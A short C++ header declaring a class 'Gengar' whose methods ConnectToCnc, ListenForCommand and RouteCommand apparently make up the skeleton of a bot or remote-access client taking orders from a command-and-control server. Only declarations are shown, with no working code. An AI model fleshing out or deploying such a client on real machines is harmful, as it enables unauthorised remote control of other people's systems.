#pragma once
#include <string>
#include "machine.h"
#include "client.h"

class Gengar
{
private:
	Machine m_machine;
	Client m_client;
	void RouteCommand(std::string&, std::string&);

public:
	void ConnectToCnc();
	void ListenForCommand();
};

